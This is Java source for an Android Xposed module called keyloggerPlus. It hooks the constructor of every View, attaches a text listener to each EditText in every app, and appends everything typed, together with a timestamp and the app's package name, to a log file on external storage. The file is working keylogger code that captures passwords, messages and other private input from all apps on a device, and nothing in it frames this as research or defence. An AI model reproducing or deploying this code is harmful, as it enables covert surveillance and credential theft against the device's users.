package com.sscsps.keyloggerPlus;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.util.Date;

import android.os.Environment;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.EditText;

import de.robv.android.xposed.IXposedHookZygoteInit;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XSharedPreferences;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;

public class Hook implements IXposedHookZygoteInit {
	
	public static final String SP_NAME = "settings";
	public static final String SPKEY_ACTIVE = "active";
	public static final String SPKEY_LOGPATH = "path";
	
	private BufferedWriter mWriter;
	private String mCache = "";
	private XSharedPreferences mXsp;
	
	@Override
	public void initZygote(StartupParam startupParam) throws Throwable {
		//Getting the preferences
		mXsp = new XSharedPreferences("com.sscsps.keyloggerPlus", SP_NAME);
		
		//Disable the module if it is desired
		if (!mXsp.getBoolean(SPKEY_ACTIVE, false)) {
			XposedBridge.log("the module is not activated.");
			return;
		}
		//Getting the View class
		Class clazz = XposedHelpers.findClass("android.view.View", null);
		//Hooking it
		XposedBridge.hookAllConstructors(clazz, new XC_MethodHook(){
			
			@Override
			protected void afterHookedMethod(MethodHookParam param) throws Throwable {
				super.afterHookedMethod(param);
				try {
					//Dont hook it if its not an instance of EditText
					if (!(param.thisObject instanceof EditText))
						return;
					
					//Cast this object into an EditText
					final EditText et = (EditText) param.thisObject;
					//Adding a listener
					et.addTextChangedListener(new TextWatcher() {

						@Override
						public void beforeTextChanged(CharSequence s, int start, int count, int after) {
							//Do nothing
						}

						@Override
						public void onTextChanged(CharSequence s, int start, int before, int count) {
							//Do nothing
						}

						@Override
						public void afterTextChanged(Editable s) {
							//Write the text of the EditText and the package name of the app running(taken from the EditTexts context)
							write(et.getContext().getPackageName(), s.toString());
						}
						
					});
				} catch (Exception e) {
					//Simply ignore
				}				
			}
			
		});
	}
	
	private synchronized void write(String id, String text) {
		//Do nothing if the text is empty or its the same as before
		if (text.equals("") || text.equals(mCache))
			return;
		
		//Creating the writer if it is null(putting it into the ZygoteInit method doesn't work)
		if (mWriter == null)
			try {
				mWriter = new BufferedWriter(new FileWriter(mXsp.getString(SPKEY_LOGPATH, Environment.getExternalStorageDirectory() + "/key.keyloggerPlus"), true));
			} catch (IOException e1) {
				return;
			}

		//getting the current date and time
		String currentDateTimeString = DateFormat.getDateTimeInstance().format(new Date());

		try {
			//Write it
			mWriter.append(currentDateTimeString + ">" + id + ">" + text);
			mWriter.newLine();
			mWriter.flush();
			//Refresh the cache
			mCache = text;
		} catch (Exception e) {
			//ignore
		}
	}	
}
